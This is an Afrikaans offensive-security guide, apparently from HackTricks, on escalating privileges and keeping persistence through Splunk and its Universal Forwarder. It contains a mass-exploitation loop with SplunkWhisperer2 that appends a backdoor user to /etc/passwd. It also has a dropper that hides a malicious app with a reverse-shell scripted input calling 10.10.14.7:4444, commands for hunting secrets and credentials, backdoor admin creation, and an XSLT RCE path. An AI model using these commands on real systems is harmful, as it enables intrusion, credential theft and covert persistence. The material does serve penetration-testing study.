# Splunk LPE en Persistence

{{#include ../../banners/hacktricks-training.md}}

As jy tydens die **enumerering** van ’n masjien **intern** of **ekstern** vind dat **Splunk loop** (gewoonlik **8000** vir die web-UI en **8089** vir die bestuurs-API), kan geldige credentials dikwels deur app-installasie, scripted inputs of bestuursaksies in **code execution** omskep word.<sup>[[1]](#references)[[5]](#references)[[6]](#references)[[10]](#references)</sup> As Splunk as **root** loop, lei dit dikwels onmiddellik tot **privilege escalation**.<sup>[[1]](#references)</sup>

As jy slegs die generiese afgeleë aanvaloppervlak, enumerering of die app-upload RCE-pad benodig, kyk na:

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

As jy **reeds root** is en die Splunk-diens nie slegs op localhost luister nie, kan jy ook **Splunk-wagwoordhashes** steel, **geënkripteerde secrets** herstel, of ’n **malicious app** instuur om plaaslik of oor verskeie forwarders persistence te behou.<sup>[[7]](#references)[[8]](#references)[[11]](#references)</sup>

## Interessante Plaaslike Lêers

Wanneer jy op ’n host beland waarop Splunk of Splunk Universal Forwarder loop, is hierdie gewoonlik die interessantste paths:<sup>[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
Belangrike artefakte:

- **`$SPLUNK_HOME/etc/passwd`**: plaaslike Splunk-gebruikers en wagwoord-hashes.<sup>[[7]](#references)</sup>
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: sleutel wat Splunk gebruik om secrets wat in verskeie `.conf`-lêers gestoor word, te enkripteer.<sup>[[8]](#references)</sup>
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: aanvanklike admin-bootstrap-lêer; nuttig in gold images en provisioning-foute. Dit word geïgnoreer indien `etc/passwd` reeds bestaan.<sup>[[9]](#references)</sup>
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: waar scripted inputs algemeen geaktiveer word.<sup>[[10]](#references)</sup>
- **`$SPLUNK_HOME/etc/deployment-apps/`** of **`$SPLUNK_HOME/etc/apps/`**: goeie plekke om ’n persistente app te versteek of na te gaan wat reeds versprei word.<sup>[[11]](#references)</sup>

## Splunk Universal Forwarder Agent Exploit Summary

Vir verdere besonderhede, raadpleeg [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Dit is slegs ’n opsomming.<sup>[[1]](#references)</sup>

**Exploit-oorsig:**
’n Exploit wat die Splunk Universal Forwarder (UF) teiken, laat attackers met die **agent-wagwoord** toe om arbitrêre code uit te voer op stelsels waarop die agent loop, wat moontlik ’n groot deel van die omgewing kan kompromitteer.<sup>[[1]](#references)</sup>

**Waarom dit werk:**

- Die UF-bestuursdiens word algemeen op **TCP 8089** blootgestel.<sup>[[6]](#references)</sup>
- Attackers kan by die API authenticateer en die forwarder opdrag gee om ’n **malicious app bundle** te installeer.<sup>[[1]](#references)[[5]](#references)</sup>
- Dieselfde primitive kan plaaslik vir **LPE** of op afstand vir **RCE** gebruik word.<sup>[[5]](#references)</sup>
- Publieke tooling soos **SplunkWhisperer2** skep die app bundle outomaties en kan payloads vir Linux-teikens aanpas.<sup>[[5]](#references)</sup>

**Algemene maniere om die wagwoord te herwin:**

- Cleartext credentials in documentation, scripts, shares of deployment automation.<sup>[[1]](#references)</sup>
- Wagwoord-hashes binne `$SPLUNK_HOME/etc/passwd`, gevolg deur offline cracking.<sup>[[1]](#references)[[7]](#references)</sup>
- Golden images of provisioning-oorskiet soos `user-seed.conf`.<sup>[[1]](#references)[[9]](#references)</sup>

**Impak:**

- SYSTEM/root-vlak-code execution op elke gekompromitteerde host.<sup>[[1]](#references)</sup>
- Deployment van persistente apps, backdoors of ransomware.<sup>[[1]](#references)</sup>
- Deaktivering of manipulering van telemetry voordat die data aangestuur word.<sup>[[1]](#references)</sup>

**Voorbeeldopdrag vir exploitation:**

Die oorspronklike verslag demonstreer die volgende loop vir die stuur van ’n payload na verskeie forwarders.<sup>[[1]](#references)</sup>
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Bruikbare publieke exploits:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Volharding via Scripted Inputs of Malicious Apps

As jy **filesystem write access** as `root`/`splunk`, of geauthentiseerde toegang het om apps te installeer, is ’n baie betroubare volhardingsmeganisme om ’n **custom app** met ’n **scripted input** te installeer.<sup>[[2]](#references)[[5]](#references)[[10]](#references)</sup> Splunk se eie dokumentasie verwag dat scripted inputs binne ’n app-gids geleë is en vanaf `inputs.conf` geaktiveer word.<sup>[[10]](#references)</sup>

Tipiese uitleg:
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
Minimale `inputs.conf`:<sup>[[10]](#references)</sup>
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
Vinnige Linux dropper (met gebruik van daardie gedokumenteerde app-uitleg):<sup>[[10]](#references)</sup>
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
Notas:

- Dieselfde truuk werk op **Universal Forwarder** deur `/opt/splunkforwarder/etc/apps/` te gebruik.<sup>[[2]](#references)[[10]](#references)</sup>
- Aanvallers meng dikwels in deur ’n wettige add-on te wysig eerder as om ’n ooglopend malicious app te skep.<sup>[[2]](#references)</sup>
- Op ’n **deployment server** verander die plant van ’n malicious app binne `deployment-apps/` in **vlootwye persistence**, omdat forwarders vir opdaterings poll, opgedateerde apps aflaai en dikwels herbegin om dit toe te pas.<sup>[[11]](#references)[[12]](#references)</sup>

## Diefstal van Credentials en Oorname van Admin

As jy Splunk se plaaslike lêers kan lees, is daar gewoonlik twee goeie doelwitte: herstel **Splunk admin-toegang** en herstel **geënkripteerde diens-credentials**.<sup>[[8]](#references)</sup>

### Password hashes en plaaslike gebruikers

Splunk stoor plaaslike authentication-data in `etc/passwd`. Afhangend van die deployment, kan cracking van daardie lêer werkende credentials vir die web UI en die management API herstel.<sup>[[1]](#references)[[7]](#references)</sup>

As jy reeds geldige **admin**-credentials het en Splunk sy **native** authentication-backend gebruik, kan die CLI self vir persistence gebruik word.<sup>[[13]](#references)</sup>
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` en encrypted values

Splunk gebruik `etc/auth/splunk.secret` om sensitiewe waardes te beskerm wat in verskeie konfigurasielêers gestoor word. As jy beide die **secret** en die relevante **`.conf`-lêers** kan steel, kan jy dikwels die volgende herwin of herspeel:<sup>[[8]](#references)</sup>

- gedeelde forwarder/indexer secrets soos `pass4SymmKey`
- wagwoorde vir TLS private keys soos `sslPassword`
- LDAP bind credentials soos `bindDNPassword`

Dit kan **lateral movement** ondersteun selfs wanneer die Splunk-adminwagwoord self nie crackable is nie.<sup>[[8]](#references)</sup>

### Misbruik van `user-seed.conf`

`user-seed.conf` word slegs tydens die eerste start gebruik, of wanneer `etc/passwd` nie bestaan nie. Dit maak dit minder nuttig op ’n live box, maar baie interessant in:<sup>[[9]](#references)</sup>

- gekompromitteerde installasietemplates
- container images
- unattended provisioning workflows
- appliances waar Splunk outomaties geherinitialiseer word

In daardie gevalle gee die plasing van ’n `HASHED_PASSWORD` wat met `splunk hash-passwd` gegenereer is, jou ’n stil manier om admin-toegang ná redeployment te herwin.<sup>[[9]](#references)</sup>

## Misbruik van Splunk Queries

Vir verdere besonderhede, kyk na [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis).<sup>[[3]](#references)[[4]](#references)</sup>

’n Nuttige onlangse tegniek is om **user-supplied XSLT** in kwesbare Splunk Enterprise-weergawes te misbruik om ’n authenticated account met lae privileges in **OS command execution** as die `splunk`-gebruiker te verander.<sup>[[3]](#references)[[4]](#references)</sup>

Hoëvlakvloei:<sup>[[3]](#references)[[4]](#references)</sup>

1. Authenticate by Splunk.
2. Upload ’n kwaadwillige **XSL**-lêer deur die preview/upload functionality.
3. Laat Splunk search results render met daardie uploaded stylesheet vanuit die **dispatch**-directory.
4. Gebruik die XSLT payload om ’n lêer te skryf of execution deur Splunk se search pipeline te trigger (byvoorbeeld deur interne functionality soos `runshellscript` te bereik).

Die belangrikste offensive takeaway is dat hierdie pad **post-auth RCE sonder app upload** is. Op Linux gee dit jou gewoonlik toegang tot die **`splunk`**-account, wat steeds waardevol is omdat daardie gebruiker dikwels die application tree besit, secrets kan lees en persistent apps kan plant wat shell loss oorleef.<sup>[[3]](#references)[[4]](#references)</sup>

’n Verteenwoordigende path wat tydens exploitation gebruik word, is:<sup>[[4]](#references)</sup>
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
As Splunk met te veel voorregte loop, of as die `splunk`-gebruiker toegang het tot gevaarlike scripts, skryfbare diens-eenhede of swak `sudo`-reëls, word dit ’n duidelike **LPE**-ketting.

## References

- [1] [Misbruik van Splunk Forwarders vir RCE en Persistence](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)
- [2] [Pasop vir TraitorWare: Gebruik Splunk vir Persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
- [3] [Splunk Security Advisory SVD-2023-1104 – XSLT Injection RCE (CVE-2023-46214)](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [4] [CVE-2023-46214-analise: Splunk XSLT Injection RCE](https://blog.hrncirik.net/cve-2023-46214-analysis)
- [5] [SplunkWhisperer2/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [6] [Verander verstekwaardes](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/10.2/start-splunk-enterprise-and-perform-initial-tasks/change-default-values)
- [7] [authentication.conf](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/10.4/configuration-file-reference/10.4.0-configuration-file-reference/authentication.conf)
- [8] [Ontplooi veilige wagwoorde oor verskeie bedieners](https://help.splunk.com/en/splunk-enterprise/administer/manage-users-and-security/10.4/install-splunk-enterprise-securely/deploy-secure-passwords-across-multiple-servers)
- [9] [user-seed.conf](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/9.2/configuration-file-reference/9.2.6-configuration-file-reference/user-seed.conf)
- [10] [Stel ’n scripted input op](https://help.splunk.com/en/splunk-enterprise/developing-views-and-apps-for-splunk-web/10.0/build-scripted-inputs/setting-up-a-scripted-input)
- [11] [Skep deployment apps](https://help.splunk.com/splunk-enterprise/administer/update-your-deployment/9.4/configure-the-deployment-system/create-deployment-apps)
- [12] [Hoe deployment-opdaterings plaasvind](https://help.splunk.com/en/splunk-enterprise/administer/update-your-deployment/9.2/deployment-server-and-forwarder-management/how-deployment-updates-happen)
- [13] [Konfigureer gebruikers met die CLI](https://help.splunk.com/en/splunk-enterprise/administer/manage-users-and-security/9.4/perform-advanced-user-and-role-management-in-splunk-enterprise/configure-users-with-the-cli)
{{#include ../../banners/hacktricks-training.md}}
